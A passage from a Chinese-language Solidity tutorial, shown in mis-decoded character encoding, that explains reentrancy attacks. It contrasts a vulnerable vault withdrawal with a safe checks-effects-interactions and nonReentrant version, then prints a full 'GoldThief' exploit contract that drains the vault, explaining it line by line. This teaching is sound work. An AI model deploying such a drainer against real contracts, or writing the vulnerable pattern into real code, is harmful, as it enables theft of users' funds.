    require(amount > 0, "Nothing to withdraw");

    (bool sent, ) = msg.sender.call{value: amount}("");
    require(sent, "ETH transfer failed");

    goldBalance[msg.sender] = 0;
}

```

ä¹ä¸€çœ‹ï¼Œè¿™å®Œå…¨æ²¡é—®é¢˜ã€‚ä½ æ£€æŸ¥ä½™é¢ã€å‘é€ ETHï¼Œç„¶åæŠŠç”¨æˆ·ä½™é¢è®¾ä¸º 0ã€‚

ä½†é‚£ä¸ªå°ç»†èŠ‚â€”â€”**æ“ä½œé¡ºåº**â€”â€”æ­£æ˜¯é™·é˜±æ‰€åœ¨ã€‚

æˆ‘ä»¬é€æ­¥çœ‹ä¼šå‘ç”Ÿä»€ä¹ˆã€‚

---

### ğŸ§ª åœºæ™¯ï¼šé—¨å£çš„æ”»å‡»è€…

å‡è®¾ä¸€ä¸ª**æ¶æ„åˆçº¦**è°ƒç”¨ `vulnerableWithdraw()`ã€‚ä½†ä¸æ™®é€šç”¨æˆ·ä¸åŒï¼Œè¿™ä¸ªåˆçº¦æœ‰ä¸€ä¸ªç‹¡çŒ¾çš„ `receive()` å‡½æ•°â€”â€”å½“å®ƒæ”¶åˆ° ETH æ—¶ **ä¼šè‡ªåŠ¨è°ƒç”¨ `vulnerableWithdraw()`**ã€‚

å‘ç”Ÿçš„äº‹æƒ…å¦‚ä¸‹ï¼š

### 1. **æ£€æŸ¥ç”¨æˆ·ä½™é¢**

```solidity

uint256 amount = goldBalance[msg.sender];
require(amount > 0, "Nothing to withdraw");

```

å¾ˆå¥½â€”â€”ç”¨æˆ·åœ¨é‡‘åº“é‡Œæœ‰ 1 ETHã€‚âœ…

---

### 2. **æŠŠ ETH å‘å›ç»™ç”¨æˆ·**

```solidity

(bool sent, ) = msg.sender.call{value: amount}("");

```

æˆ‘ä»¬æŠŠ ETH å‘å›ç»™ `msg.sender`ã€‚

ä½†æœ‰ä¸ªè½¬æŠ˜ï¼šå¦‚æœ `msg.sender` æ˜¯ä¸€ä¸ªåˆçº¦åœ°å€ï¼Œå®ƒçš„ `receive()` å‡½æ•°ä¼šåœ¨æ¥æ”¶ ETH æ—¶è¢«è§¦å‘ã€‚è€Œåœ¨é‚£ä¸ª `receive()` å‡½æ•°ä¸­ï¼Œå®ƒ**å†æ¬¡è°ƒç”¨ `vulnerableWithdraw()`**ã€‚

äºæ˜¯â€¦â€¦åœ¨æˆ‘ä»¬è¿˜æœªæ›´æ–°ç”¨æˆ·ä½™é¢ä¹‹å‰ï¼Œæˆ‘ä»¬åˆå›åˆ°äº†åŒä¸€ä¸ªå‘é€ETHçš„å‡½æ•°å†…éƒ¨ã€‚

---

### 3. **å†æ¬¡æç°â€¦â€¦å†ä¸€æ¬¡â€¦â€¦**

ç”±äºæˆ‘ä»¬è¿˜æ²¡æ‰§è¡Œè¿™ä¸€è¡Œï¼š

```solidity

goldBalance[msg.sender] = 0;

```

æ”»å‡»è€…çš„ä½™é¢**çœ‹èµ·æ¥ä¾ç„¶æ˜¾ç¤ºä¸º 1 ETH**ã€‚

å› æ­¤ï¼Œå½“æ£€æŸ¥é‡å…¥è°ƒç”¨è€…çš„ä½™é¢æ—¶ï¼ŒTaä¼šå†æ¬¡é€šè¿‡æ£€æŸ¥æ¡ä»¶ã€‚

é‡‘åº“**å†æ¬¡å‘é€ 1 ETH**ã€‚

æ¥ç€ `receive()` åˆè¢«è§¦å‘ã€‚

å¾ªç¯ç»§ç»­ã€‚

è¿™ä¸ªå¾ªç¯åœ¨**åˆçº¦æŠŠæ”»å‡»è€…çš„ä½™é¢ç½®ä¸º 0 ä¹‹å‰å°±æŠŠé‡‘åº“æç©ºäº†**ã€‚

---

### âš ï¸ ä¸ºä»€ä¹ˆè¿™å¾ˆå±é™©

è¿™å°±æ˜¯æ•™ç§‘ä¹¦å¼çš„**é‡å…¥æ”»å‡»**ï¼š

- åœ¨æ›´æ–°ä½™é¢çŠ¶æ€ä¹‹å‰è¿›è¡Œäº†å¤–éƒ¨è°ƒç”¨ âœ…
- æ”»å‡»è€…åœ¨é‡‘åº“æ‰§è¡Œå‘é€è¿‡ç¨‹ä¸­é‡å…¥ âœ…
- å•ä¸€ä½™é¢è¢«å¤šæ¬¡æç°å¯¼è‡´èµ„é‡‘è¢«æ¦¨å¹² âœ…

---

## âœ… `safeWithdraw()` â€”â€” é…å¤‡ `nonReentrant` é˜²æŠ¤

```solidity

function safeWithdraw() external nonReentrant {
    uint256 amount = goldBalance[msg.sender];
    require(amount > 0, "Nothing to withdraw");

    goldBalance[msg.sender] = 0;
    (bool sent, ) = msg.sender.call{value: amount}("");
    require(sent, "ETH transfer failed");
}

```

è¿™æ˜¯æˆ‘ä»¬æç°å‡½æ•°çš„**å®‰å…¨ç‰ˆæœ¬**â€”â€”å®ƒæŠŠé‡å…¥æ”»å‡»æŒ¡åœ¨äº†é—¨å¤–ã€‚

æˆ‘ä»¬æ¥æ‹†è§£**å‘ç”Ÿäº†ä»€ä¹ˆå˜åŒ–**ä»¥åŠ**ä¸ºä»€ä¹ˆå®ƒæœ‰æ•ˆ**ã€‚

---

### ğŸ§± ç¬¬ä¸€æ­¥ä¿®å¤ï¼šåœ¨å‘é€ ETH ä¹‹å‰æ›´æ–°ä½™é¢çŠ¶æ€

```solidity

goldBalance[msg.sender] = 0;

```

ç°åœ¨è¿™ä¸€è¡Œåœ¨æˆ‘ä»¬å‘é€ä»»ä½• ETH ä¹‹å‰æ‰§è¡Œã€‚è¿™æ„å‘³ç€æç°ä¸€å¼€å§‹æˆ‘ä»¬å°±æŠŠç”¨æˆ·ä½™é¢æ¸…é›¶ã€‚

å³ä½¿æ”»å‡»è€…å°è¯•**é‡æ–°è¿›å…¥æç°å‡½æ•°**ï¼ŒTaä»¬ä¹Ÿä¼šçœ‹åˆ°ä½™é¢ä¸º `0`â€”â€”å¹¶ä¸”æç°å°†ç«‹å³å¤±è´¥ã€‚

å•é è¿™ä¸ªæ”¹å˜å°±**æ‰“ç ´äº†æ¼æ´å¾ªç¯**ï¼Œè¯¥å¾ªç¯åœ¨æ˜“å—æ”»å‡»ç‰ˆæœ¬ä¼šæç©ºåˆçº¦ã€‚

---

### ğŸ”’ ç¬¬äºŒæ­¥ä¿®å¤ï¼š`nonReentrant` ä¿®é¥°ç¬¦

```solidity

function safeWithdraw() external nonReentrant { ... }

```

é™¤äº†ä¿®æ­£æ“ä½œé¡ºåºï¼Œæˆ‘ä»¬è¿˜åœ¨å‡½æ•°ä¸ŠåŠ äº† `nonReentrant` ä¿®é¥°ç¬¦ï¼Œä½œä¸ºé¢å¤–çš„é˜²çº¿ã€‚

å®ƒçš„ä½œç”¨ï¼š

- ä¸€æ—¦æœ‰äººè¿›å…¥å‡½æ•°ï¼Œå°±**é”ä½**å‡½æ•°
- å¦‚æœåŒä¸€åœ°å€ï¼ˆæˆ–ä»»ä½•å¤–éƒ¨åˆçº¦ï¼‰è¯•å›¾å†æ¬¡è°ƒç”¨â€”â€”å³ä½¿é€šè¿‡fallbackå›é€€å‡½æ•°â€”â€”ä¹Ÿä¼š**ç«‹å³è¢«é˜»æ­¢**
- å‡½æ•°æ‰§è¡Œå®Œæ¯•åè§£é”

å³ä½¿æˆ‘ä»¬å¿˜äº†æå‰æŠŠä½™é¢ç½®é›¶ï¼Œè¿™ä¸ªé”ä¹Ÿèƒ½ç‹¬ç«‹é˜»æ­¢æ”»å‡»ã€‚

---

### âœ… éµå¾ª â€œChecks-Effects-Interactionsâ€ æ¨¡å¼

è¿™ä¸ªå‡½æ•°ç°åœ¨éµå¾ªä¸€ä¸ª**è‘—åçš„ Solidity æœ€ä½³å®è·µ**ï¼Œç§°ä¸º **Checks-Effects-Interactionsï¼ˆæ£€æŸ¥-çŠ¶æ€å˜æ›´-äº¤äº’ï¼‰** æ¨¡å¼ï¼š

1. **Check**ï¼ˆæ£€æŸ¥æ¡ä»¶ï¼‰
    
    `require(amount > 0, "Nothing to withdraw");`
    
2. **Effect**ï¼ˆæ”¹å˜çŠ¶æ€ï¼‰
    
    `goldBalance[msg.sender] = 0;`
    
3. **Interaction**ï¼ˆä¸å¤–éƒ¨åˆçº¦äº¤äº’ï¼‰
    
    `msg.sender.call{value: amount}("");`
    

ä¸ºä»€ä¹ˆè¿™ä¸ªé¡ºåºé‡è¦ï¼š

å½“æˆ‘ä»¬ä¸å¤–éƒ¨ä¸–ç•Œäº¤äº’ï¼ˆé‚£æ˜¯æˆ‘ä»¬æ— æ³•æ§åˆ¶çš„ï¼‰æ—¶ï¼Œæˆ‘ä»¬è‡ªå·±çš„åˆçº¦çŠ¶æ€å·²ç»å®‰å…¨æ›´æ–°ã€‚

è¿™é¿å…äº†ä¸€å¤§ç±»æ¼æ´â€”â€”è€Œä¸ä»…ä»…æ˜¯é‡å…¥ã€‚

## ğŸ¦¹â€â™‚ï¸ `GoldThief.sol` â€”â€” é‡å…¥åˆ©ç”¨åˆçº¦ï¼ˆä»…ä¾›å­¦ä¹ ï¼‰

> âš ï¸ å…è´£å£°æ˜ï¼š
> 
> 
> è¯¥åˆçº¦çº¯å±**æ•™å­¦ç”¨é€”**ã€‚
> 
> æˆ‘ä»¬**ä¸**é¼“åŠ±ä»¥ä»»ä½•æœ‰å®³æˆ–æ¶æ„æ–¹å¼ä½¿ç”¨æˆ–éƒ¨ç½²æ­¤åˆçº¦ã€‚ç›®æ ‡æ˜¯å¸®åŠ©ä½ ç†è§£ **é‡å…¥æ”»å‡»çš„å·¥ä½œåŸç†**â€”â€”ä»¥ä¾¿ä½ å­¦ä¼š**é˜²èŒƒ**ï¼Œè€Œä¸æ˜¯å»åˆ©ç”¨å®ƒä»¬ã€‚
> 

---

è¦çœŸæ­£ç†è§£é‡å…¥æ”»å‡»ï¼Œä»…ä»…åŠ å›ºä½ çš„åˆçº¦è¿˜ä¸å¤Ÿâ€”â€”ä½ è¿˜éœ€è¦**åƒæ”»å‡»è€…é‚£æ ·æ€è€ƒ**ã€‚

è¿™å°±æ˜¯è¿™ä¸ªåˆçº¦çš„æ„ä¹‰æ‰€åœ¨ã€‚

`GoldThief.sol` æ¨¡æ‹Ÿä¸€ä¸ªæ¶æ„è¡Œä¸ºè€…ã€‚å®ƒæ—¨åœ¨é’ˆå¯¹ `GoldVault` åˆçº¦å†…çš„ `vulnerableWithdraw()` å‡½æ•°ï¼Œé€šè¿‡åœ¨é‡‘åº“æ›´æ–°æ”»å‡»è€…ä½™é¢ä¹‹å‰ä¸æ–­é‡å¤è°ƒç”¨è¯¥å‡½æ•°ï¼Œæ¥**æŠ½å–æ¯”åº”å…çš„æ›´å¤šçš„èµ„é‡‘**ã€‚

æˆ‘ä»¬è¿˜åŠ å…¥äº†ä¸€ä¸ªå¯¹ `safeWithdraw()` ç‰ˆæœ¬çš„æµ‹è¯•è°ƒç”¨ï¼Œä»¥å±•ç¤ºå½“æ­£ç¡®ä¿æŠ¤åˆ°ä½æ—¶æ”»å‡»ä¼šå¦‚ä½•**å¤±è´¥**ã€‚

---

### ğŸ§ª è¿™ä¸ªåˆçº¦çš„ä½œç”¨

- å®ƒé€šè¿‡ç®€å•æ¥å£è¿æ¥åˆ°é‡‘åº“ã€‚
- åƒæ™®é€šç”¨æˆ·ä¸€æ ·å‘é‡‘åº“å­˜å…¥ ETHã€‚
- å½“å®ƒè°ƒç”¨ `vulnerableWithdraw()` æ—¶ï¼Œä¼šåˆ©ç”¨ Solidity çš„ `receive()` å‡½æ•°è¿›å…¥ä¸€ä¸ªæ¼æ´å¾ªç¯â€”â€”åœ¨åŸå§‹è°ƒç”¨å®Œæˆä¹‹å‰é‡å¤è°ƒç”¨ `vulnerableWithdraw()`ã€‚
- åœ¨å®‰å…¨ç‰ˆæœ¬ä¸­ï¼Œç›¸åŒçš„æ”»å‡»å°è¯•ä¼šå› ä¸º `nonReentrant` é”è€Œè¢«æŒ¡ä½ã€‚

è¿™æ˜¯ä¸€ä¸ªäº²æ‰‹è§‚å¯Ÿæ”»å‡»å¦‚ä½•å‘ç”Ÿã€ç†è§£å…¶åº•å±‚æœºåˆ¶ã€å¹¶æœ‰ä¿¡å¿ƒåœ¨ä½ è‡ªå·±çš„åˆçº¦ä¸­æ„å»ºé˜²å¾¡çš„å®æ“æ–¹å¼ã€‚

æ¥çœ‹å®Œæ•´ä»£ç ï¼šğŸ‘‡

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IVault {
function deposit() external payable;
function vulnerableWithdraw() external;
function safeWithdraw() external;
}

contract GoldThief {
IVault public targetVault;
address public owner;
uint public attackCount;
bool public attackingSafe;

constructor(address _vaultAddress) {
    targetVault = IVault(_vaultAddress);
    owner = msg.sender;
}

function attackVulnerable() external payable {
    require(msg.sender == owner, "Only owner");
    require(msg.value >= 1 ether, "Need at least 1 ETH to attack");

    attackingSafe = false;
    attackCount = 0;

    targetVault.deposit{value: msg.value}();
    targetVault.vulnerableWithdraw();
}

function attackSafe() external payable {
    require(msg.sender == owner, "Only owner");
    require(msg.value >= 1 ether, "Need at least 1 ETH");

    attackingSafe = true;
    attackCount = 0;

    targetVault.deposit{value: msg.value}();
    targetVault.safeWithdraw();
}

receive() external payable {
    attackCount++;

    if (!attackingSafe && address(targetVault).balance >= 1 ether && attackCount < 5) {
        targetVault.vulnerableWithdraw();
    }

    if (attackingSafe) {
        targetVault.safeWithdraw(); // This will fail due to nonReentrant
    }
}

function stealLoot() external {
    require(msg.sender == owner, "Only owner");
    payable(owner).transfer(address(this).balance);
}

function getBalance() external view returns (uint256) {
    return address(this).balance;
}
}
```

---

## ğŸ¯ æ¥å£è®¾ç½® â€”â€” ä¸é‡‘åº“å¯¹è¯

```solidity

interface IVault {
    function deposit() external payable;
    function vulnerableWithdraw() external;
    function safeWithdraw() external;
}

```

åœ¨ `GoldThief` åˆçº¦èƒ½ä¸é‡‘åº“äº¤äº’ä¹‹å‰ï¼Œå®ƒéœ€è¦çŸ¥é“**æœ‰å“ªäº›å‡½æ•°å¯ç”¨**â€”â€”ä»¥åŠå¦‚ä½•è°ƒç”¨å®ƒä»¬ã€‚

è¿™å°±æ˜¯è¿™ä¸ª **interfaceï¼ˆæ¥å£ï¼‰** çš„ç”¨é€”ã€‚

---

### ğŸ§  Solidity ä¸­çš„æ¥å£æ˜¯ä»€ä¹ˆï¼Ÿ

æŠŠå®ƒæƒ³è±¡æˆé¤å…çš„**èœå•**ã€‚

ä½ ä¸éœ€è¦çŸ¥é“å¨å¸ˆå¦‚ä½•åšæ¯é“èœâ€”â€”ä½ åªéœ€è¦çŸ¥é“ï¼š

- èœå•ä¸Šæœ‰ä»€ä¹ˆèœï¼ˆå‡½æ•°åï¼‰
- éœ€è¦ä»€ä¹ˆææ–™ï¼ˆå‚æ•°ï¼‰
- ä¼šå¾—åˆ°ä»€ä¹ˆï¼ˆè¿”å›ç±»å‹ï¼Œå¦‚æœæœ‰çš„è¯ï¼‰

åœ¨ Solidity ä¸­ï¼Œ`interface` ï¼ˆæ¥å£ï¼‰åŸºæœ¬ä¸Šæ˜¯ä¸€ä¸ª**è½»é‡çº§çš„åˆçº¦å®šä¹‰**ï¼ŒåªåŒ…å« **å‡½æ•°ç­¾å**â€”â€”æ²¡æœ‰å®ç°ç»†èŠ‚ã€‚

---

### ğŸ§© ä¸ºä»€ä¹ˆéœ€è¦å®ƒï¼Ÿ

æˆ‘ä»¬çš„ `GoldThief` åˆçº¦æƒ³è¦ï¼š

- è°ƒç”¨ `deposit()` æ¥å‘é€ ETH
- è°ƒç”¨ `vulnerableWithdraw()` æ¥è§¦å‘æ”»å‡»
- è°ƒç”¨ `safeWithdraw()` æ¥æµ‹è¯•é‡‘åº“æ˜¯å¦ä¼šé˜»æŒ¡

ä½†æˆ‘ä»¬ä¸éœ€è¦æŠŠæ•´ä¸ª `GoldVault` æºä»£ç å¯¼å…¥è¿›æ¥â€”â€”é‚£æ²¡å¿…è¦ã€‚

ç›¸åï¼Œæˆ‘ä»¬å®šä¹‰è¿™ä¸ª `IVault` æ¥å£æ¥å‘Šè¯‰ç¼–è¯‘å™¨ï¼š

> â€œç›®æ ‡é‡‘åº“æœ‰è¿™ä¸‰ä¸ªå‡½æ•°ã€‚æˆ‘æƒ³è·Ÿå®ƒä»¬äº¤äº’ã€‚â€
> 

ä¸€æ—¦å£°æ˜äº†æ¥å£ï¼Œæˆ‘ä»¬å°±å¯ä»¥æŠŠé‡‘åº“çš„åˆçº¦åœ°å€å½“ä½œ `IVault` æ¥å£çš„å®ä¾‹ï¼Œå¹¶ç›´æ¥è°ƒç”¨è¿™äº›å‡½æ•°ã€‚

---

## ğŸ“¦ çŠ¶æ€å˜é‡

```solidity

IVault public targetVault;
address public owner;
uint public attackCount;
bool public attackingSafe;

```

è¿™äº›å˜é‡å‚¨å­˜æ”»å‡»è€…çš„â€œè®°å¿†â€â€”â€”ç›®æ ‡åˆçº¦æ˜¯è°ï¼Œè°åœ¨æ§åˆ¶ï¼Œä»¥åŠå½“å‰æ˜¯æ”»å‡»**æ˜“å—æ”»å‡»ç‰ˆæœ¬**è¿˜æ˜¯**å®‰å…¨ç‰ˆæœ¬**ã€‚

é€ä¸€è§£é‡Šå¦‚ä¸‹ï¼š

---

### ğŸ¹ `IVault public targetVault`

`targetVault`æ˜¯**æˆ‘ä»¬è¦æ”»å‡»çš„é‡‘åº“åœ°å€**ï¼Œç”¨ `IVault` æ¥å£åŒ…è£…ã€‚

æ¥å£è®©æˆ‘ä»¬èƒ½å¤Ÿè°ƒç”¨é‡‘åº“çš„å…¬å…±å‡½æ•°ï¼Œæ¯”å¦‚ `deposit()`ã€`vulnerableWithdraw()`ã€`safeWithdraw()`â€”â€”å³ä¾¿æˆ‘ä»¬æ²¡æœ‰å®Œæ•´æºç ã€‚

å°±åƒæŠŠé¥æ§å™¨å¯¹å‡†ç”µè§†â€”â€”æˆ‘ä»¬ä¸å…³å¿ƒç”µè§†å†…éƒ¨å¦‚ä½•æ„é€ ï¼Œåªåœ¨ä¹æŒ‰é”®ï¼ˆå‡½æ•°åï¼‰èƒ½å¦è¾¾åˆ°é¢„æœŸæ•ˆæœã€‚

---

### ğŸ§‘â€ğŸ’¼ `address public owner`

å­˜å‚¨**éƒ¨ç½²æ”»å‡»åˆçº¦çš„åœ°å€**â€”â€”â€œä¸»è°‹â€ã€‚

åªæœ‰ `owner` è¢«å…è®¸è§¦å‘æ”»å‡»æˆ–æå–è¢«ç›—èµ„é‡‘ï¼Œé˜²æ­¢å…¶Taäººåœ¨éƒ¨ç½²ååŠ«æŒè¯¥åˆçº¦ã€‚

è¿™æ˜¯åŸºæœ¬çš„è®¿é—®æ§åˆ¶â€”â€”åªæœ‰åŸå§‹æ”»å‡»è€…èƒ½æŒ‰ä¸‹çº¢è‰²æŒ‰é’®ã€‚

---

### ğŸ” `uint public attackCount`

è®°å½•æˆ‘ä»¬**é‡å…¥å¾ªç¯çš„æ¬¡æ•°ã€‚**

ä¸ºä»€ä¹ˆè¿™å¾ˆé‡è¦ï¼Ÿ

å› ä¸ºå¦‚æœä¸é™åˆ¶ï¼Œæ”»å‡»å¯èƒ½ä¼šæ— é™å¾ªç¯ï¼ˆæˆ–ç›´åˆ° gas ç”¨å°½ï¼‰ã€‚æˆ‘ä»¬ç”¨è®¡æ•°å™¨æ¥é™åˆ¶fallbackå›é€€å‡½æ•°é‡å¤è°ƒç”¨é‡‘åº“çš„æœ€å¤§æ¬¡æ•°â€”â€”åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæœ€å¤š 5 æ¬¡ã€‚

---

### ğŸ•µï¸â€â™‚ï¸ `bool public attackingSafe`

è¿™ä¸ªæ ‡å¿—è®°å½•æˆ‘ä»¬å½“å‰æ”»å‡»çš„æ˜¯å“ªä¸€ä¸ªç‰ˆæœ¬çš„é‡‘åº“ï¼š

- è‹¥ `attackingSafe` ä¸º `false`ï¼Œæˆ‘ä»¬åœ¨æ”»å‡» **vulnerableWithdraw()**
- è‹¥ä¸º `true`ï¼Œæˆ‘ä»¬åœ¨æµ‹è¯• **safeWithdraw()** â€”â€”é¢„è®¡ä¼š**å¤±è´¥**

è¿™å¸®åŠ©æˆ‘ä»¬åœ¨ `receive()` å‡½æ•°å†…å†³å®šåœ¨é‡å…¥å¾ªç¯ä¸­ä½¿ç”¨å“ªä¸€ä¸ªæ–¹æ³•ã€‚

---

## ğŸ”§ æ„é€ å‡½æ•° â€”â€” å¸ƒå±€èˆå°

```solidity

constructor(address _vaultAddress) {
    targetVault = IVault(_vaultAddress);
    owner = msg.sender;
}

```

è¿™æ˜¯ `GoldThief` åˆçº¦éƒ¨ç½²æ—¶è¿è¡Œçš„**ç¬¬ä¸€ä¸ªå‡½æ•°**â€”â€”å®ƒè®¾ç½®æ”»å‡»è€…å¼€å§‹æ‰€éœ€çš„ä¸€åˆ‡ã€‚

æˆ‘ä»¬æ¥æ‹†è§£å®ƒçš„ä½œç”¨ï¼š

---

### ğŸ¯ `targetVault = IVault(_vaultAddress);`

éƒ¨ç½² `GoldThief` æ—¶ï¼Œæˆ‘ä»¬ä¼ å…¥æƒ³æ”»å‡»çš„é‡‘åº“åœ°å€â€”â€”è¿™å¯ä»¥æ˜¯ä»»ä½•éµå¾ª `IVault` æ¥å£çš„å·²éƒ¨ç½²çš„åˆçº¦åœ°å€ã€‚

è¿™è¡Œä»£ç æŠŠè¦æ”»å‡»çš„åœ°å€å‘ŠçŸ¥`GoldThief`åˆçº¦ï¼š

> â€œè¿™æ˜¯æˆ‘ä»¬è¦å¯¹è¯çš„é‡‘åº“â€”â€”ä¸‹é¢æˆ‘ä»¬ä¼šæ€æ ·ä¸ä¹‹äº¤äº’ã€‚â€
> 

é€šè¿‡å°†è¦æ”»å‡»çš„é‡‘åº“åœ°å€è½¬æ¢ä¸º `IVault`ï¼Œæˆ‘ä»¬å¯ä»¥è°ƒç”¨ç›®æ ‡ä¸Šçš„ `deposit()`ã€`vulnerableWithdraw()`ã€`safeWithdraw()`ã€‚

---

### ğŸ§‘â€ğŸ’¼ `owner = msg.sender;`

è¿™è¡Œè®¾ç½®**æ‰€æœ‰è€…**â€”â€”è®°å½•éƒ¨ç½² `GoldThief` çš„äºº(æˆ–è„šæœ¬)çš„åœ°å€ã€‚

è¿™é‡Œ `msg.sender` å³å¯åŠ¨æ”»å‡»åˆçº¦çš„äºº/è„šæœ¬ã€‚

è¿™å¯¹ä»¥ä¸‹äº‹é¡¹å¾ˆé‡è¦ï¼š

- ç¡®ä¿åªæœ‰ `owner` èƒ½è§¦å‘æ”»å‡»ï¼ˆ`attackVulnerable()` / `attackSafe()`ï¼‰
- é˜²æ­¢æœªç»æˆæƒè®¿é—® `stealLoot()` ç­‰å‡½æ•°

å°±åƒæŠŠçº¢è‰²å‘å°„æŒ‰é’®çš„æ§åˆ¶æƒæŒ‡å®šç»™æŸä¸ªäººâ€”â€”å…¶TaäººæŒ‰ä¸åˆ°ã€‚

---

## ğŸ’£ `attackVulnerable()` â€”â€” å¼€å§‹æŠ¢åŠ«

---

```solidity

function attackVulnerable() external payable {
    require(msg.sender == owner, "Only owner");
    require(msg.value >= 1 ether, "Need at least 1 ETH to attack");

    attackingSafe = false;
    attackCount = 0;

    targetVault.deposit{value: msg.value}();
    targetVault.vulnerableWithdraw();
}

```

è¿™æ˜¯**æ­£å¼å‘åŠ¨æ”»å‡»**çš„åœ°æ–¹ã€‚æ”»å‡»è€…è°ƒç”¨è¯¥å‡½æ•°å‘èµ·ä¸€ä¸ªæ»¥ç”¨é‡‘åº“è„†å¼±é€»è¾‘çš„è¿é”ååº”ã€‚

æˆ‘ä»¬æ¥é€è¡Œè§£é‡ŠèƒŒåçœŸå®æœºåˆ¶çš„è¿ä½œåŸç†ã€‚

---

### ğŸ§‘â€ğŸ’¼ è®¿é—®æ§åˆ¶

```solidity

require(msg.sender == owner, "Only owner");

```

åªæœ‰åˆçº¦çš„åŸå§‹æ”»å‡»è€…ï¼ˆæˆ–è¯¥åˆçº¦çš„éƒ¨ç½²è€…ï¼‰è¢«å…è®¸å¯åŠ¨æ”»å‡»ã€‚è¿™æ˜¯åŸºæœ¬çš„å®‰å…¨å±‚ï¼Œé˜²æ­¢TaäººåŠ«æŒåˆçº¦ã€‚

---

### ğŸ’° æœ€ä½ ETH è¦æ±‚

```solidity

require(msg.value >= 1 ether, "Need at least 1 ETH to attack");

```

æ”»å‡»è€…å¿…é¡»åœ¨è°ƒç”¨è¯¥å‡½æ•°æ—¶å‘é€**è‡³å°‘ 1 ETH**â€”â€”è¿™æ˜¯åˆå§‹çš„â€œè¯±é¥µâ€å­˜æ¬¾ï¼Œè®©é‡‘åº“ä»¥ä¸ºè¿™æ˜¯æ­£å¸¸ç”¨æˆ·è¡Œä¸ºã€‚

---

### ğŸ” é‡ç½®çŠ¶æ€

```solidity

attackingSafe = false;
attackCount = 0;

```

æˆ‘ä»¬ç¡®ä¿åˆçº¦çŸ¥é“è¿™æ˜¯ä¸€æ¬¡**é’ˆå¯¹æ˜“å—æ”»å‡»ç‰ˆæœ¬**çš„æ”»å‡»ï¼Œè€Œä¸æ˜¯å¯¹å®‰å…¨ç‰ˆæœ¬çš„æµ‹è¯•ã€‚

å¹¶é‡ç½®å¾ªç¯è®¡æ•°å™¨ä»¥ä¾¿ä»å¤´å¼€å§‹ã€‚

---

### ğŸ£ è¯±é¥µï¼šå‘é‡‘åº“å­˜å…¥ ETH

```solidity
targetVault.deposit{value: msg.value}();

```

æˆ‘ä»¬åƒæ™®é€šç”¨æˆ·ä¸€æ ·å‘é‡‘åº“å­˜å…¥åˆæ³•çš„ ETHã€‚è¿™ä¼šæ›´æ–°é‡‘åº“å†…éƒ¨æ˜ å°„ä¸­çš„æˆ‘ä»¬çš„ä½™é¢â€”â€”ä½¿æˆ‘ä»¬æœ‰èµ„æ ¼æç°è¿™äº› ETHã€‚

æ­¤æ—¶ï¼Œé‡‘åº“å®‰å…¨åœ°æŒæœ‰æˆ‘ä»¬çš„ 1 ETHâ€¦â€¦æˆ–è€…è¯´ï¼Œå®ƒâ€œè®¤ä¸ºâ€æ˜¯å®‰å…¨çš„ã€‚

---

### ğŸšª å…¥å£ç‚¹ï¼šè§¦å‘æç°

```solidity
 targetVault.vulnerableWithdraw();

```

ç°åœ¨æˆ‘ä»¬è°ƒç”¨é‡‘åº“çš„æ˜“å—æ”»å‡»æç°å‡½æ•°ã€‚

è¯¥å‡½æ•°ä¼šï¼š

- **æ£€æŸ¥æˆ‘ä»¬çš„ä½™é¢**
- **æŠŠ ETH å‘é€ç»™æˆ‘ä»¬**
- **ä¹‹å**æ‰æŠŠæˆ‘ä»¬çš„ä½™é¢è®¾ä¸ºé›¶

è¿™å°±æ˜¯**è‡´å‘½é”™è¯¯**â€”â€”å°±åœ¨é‡‘åº“æŠŠ ETH å‘å‡ºæ—¶ï¼Œæˆ‘ä»¬åˆçº¦çš„ `receive()` è¢«è§¦å‘äº†â€¦â€¦

## âš¡ `receive()` â€”â€” é‡å…¥é­”æœ¯å‘ç”Ÿå¤„

```solidity
 receive() external payable {
    attackCount++;

    if (!attackingSafe && address(targetVault).balance >= 1 ether && attackCount < 5) {
        targetVault.vulnerableWithdraw();
    }

    if (attackingSafe) {
        targetVault.safeWithdraw(); // This will fail
    }
}

```

è¿™ä¸ªå‡½æ•°æ˜¯**æ”»å‡»å¾ªç¯çš„æ ¸å¿ƒ**â€”â€”å°±æ˜¯é‡‘åº“è¢«åŒä¸€æ¶æ„è¡Œä¸ºè€…ä¸€æ¬¡åˆä¸€æ¬¡æ¬ºéª—çš„åœ°æ–¹ã€‚

ä½†å…³é”®æ˜¯ï¼šæ”»å‡»è€…**ä»æœªç›´æ¥è°ƒç”¨è¿™ä¸ªå‡½æ•°**ã€‚

ç›¸åï¼Œå½“åˆçº¦**æ¥æ”¶åˆ° ETH** æ—¶ï¼ŒSolidity ä¼š**è‡ªåŠ¨è§¦å‘**å®ƒã€‚

---

### ğŸ” æˆ‘ä»¬æ¥èµ°ä¸€éå‘ç”Ÿçš„æµç¨‹

å½“é‡‘åº“åœ¨ `withdraw()` ä¸­æŠŠ ETH å‘å›æ—¶ï¼ŒSolidity ä¼šåœ¨æ¥æ”¶åˆçº¦ä¸Šå¯»æ‰¾ä¸¤ç§æƒ…å†µä¸­çš„ä¸€ç§ï¼š

- ä¸€ä¸ª `receive()` å‡½æ•°ï¼ˆåƒç°åœ¨æ¡ˆä¾‹ä¸­çš„ï¼‰
- æˆ–è€…ï¼ˆè‹¥æ²¡æœ‰ `receive()`ï¼‰ä¸€ä¸ª `fallback()` å›é€€å‡½æ•°

å› ä¸ºæˆ‘ä»¬å®šä¹‰äº† `receive()`ï¼Œæ‰€ä»¥**æ¯æ¬¡æ”¶åˆ° ETH æ—¶**å®ƒéƒ½ä¼šè¢«è§¦å‘ã€‚

---

### ğŸ§  æ”»å‡»é€»è¾‘å†…éƒ¨è§£æ

æŠŠè¿™ä¸ªå‡½æ•°é‡Œçš„é€»è¾‘æ‹†å¼€çœ‹ï¼š

---

### 1. ğŸ§® ç»Ÿè®¡æ”»å‡»å¾ªç¯æ¬¡æ•°

```solidity
attackCount++;

```

æ¯è¿è¡Œä¸€æ¬¡è¿™ä¸ªå‡½æ•°ï¼Œæˆ‘ä»¬å°±æŠŠè®¡æ•°å™¨åŠ ä¸€ã€‚è¿™æœ‰åŠ©äºæˆ‘ä»¬**é™åˆ¶é‡å…¥æ¬¡æ•°**ï¼Œé¿å…æ— é™å¾ªç¯å¹¶è€—å°½ gasã€‚

---

### 2. ğŸ” å¦‚æœæˆ‘ä»¬ç›®æ ‡æ˜¯æ˜“å—æ”»å‡»é‡‘åº“â€¦â€¦

```solidity

if (!attackingSafe && address(targetVault).balance >= 1 ether && attackCount < 5) {
